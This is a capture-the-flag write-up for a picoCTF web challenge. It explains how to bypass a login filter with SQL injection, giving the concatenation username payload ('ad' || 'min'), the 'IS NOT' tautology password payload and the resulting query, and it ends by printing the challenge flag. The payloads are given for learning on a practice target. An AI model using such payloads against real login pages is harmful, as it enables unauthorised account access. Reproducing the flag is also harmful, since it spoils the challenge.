## Challenge Description
This website looks familiar... Log in as admin 

Site: [http://mercury.picoctf.net:26215/](http://mercury.picoctf.net:26215/)

Filter: [http://mercury.picoctf.net:26215/filter.php](http://mercury.picoctf.net:26215/filter.php)


## Writeup
Given the filters for this challenge are: or and true false union like = > < ; -- /* */ admin


So I tried the same approach as the previous question but I realised that since the `;` character has been filtered we can no longer end the query. So now I tried a new approach. 

I tried the username admin using concentation and got the message as `not admin`

![image](https://github.com/AKripper/COPS-CSOC/assets/167231621/a08e57f0-f660-4a96-badc-de0216fcf0c0)

This is a good sign as we know the word was not filtered out.

Our query is: 
- **SELECT username, password FROM users WHERE username='ad'||'min' AND password='pass'**

Now I checked some [SQLite operators](https://www.sqlite.org/lang_expr.html) and found out the `IS NOT` operator that works like `!=`(not equal to).

So our `password` parameter can be set to `true`, we can exploit the the login portal.

For this I tried this method

- username : **ad' || 'min**
- password : **1' IS NOT '2**

This way the password parameter is set to `true` and our query becomes:

- **SELECT username, password FROM users WHERE username='ad'||'min' AND password='1' IS NOT '2'**

![image](https://github.com/AKripper/COPS-CSOC/assets/167231621/cc4006a0-61a4-462c-bc0b-a30dce8a232c)

Thus we have bypassed the filters. And we get the flag in the `filter.php` page.

## Flag
picoCTF{0n3_m0r3_t1m3_fc0f841ee8e0d3e1f479f1a01a617ebb}
